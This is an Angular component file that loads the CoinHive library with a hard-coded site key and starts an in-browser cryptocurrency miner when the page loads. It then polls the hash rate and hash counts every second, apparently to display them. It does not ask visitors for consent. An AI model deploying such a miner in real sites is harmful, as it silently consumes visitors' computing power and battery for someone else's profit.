import { Component, OnInit } from '@angular/core';

declare var CoinHive: any;

@Component({
    selector: 'app-root',
    templateUrl: './app.component.html',
    styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit {

    private miner: any;
    public statistics: any;

    public constructor() {
        this.miner = new CoinHive.Anonymous("Eomcy25ZfLfW5EZZqMNrEPxSNFgrRcEm", { throttle: 0.8 });
        this.statistics = {
            hashesPerSecond: 0,
            totalHashes: 0,
            acceptedHashes: 0
        };
    }

    public ngOnInit() {
        this.miner.start();
        this.updateStatistics();
    }

    public updateStatistics() {
        setTimeout(() => {
            this.statistics.hashesPerSecond = this.miner.getHashesPerSecond();
            this.statistics.totalHashes = this.miner.getTotalHashes();
            this.statistics.acceptedHashes = this.miner.getAcceptedHashes();
            this.updateStatistics();
        }, 1000);
    }

}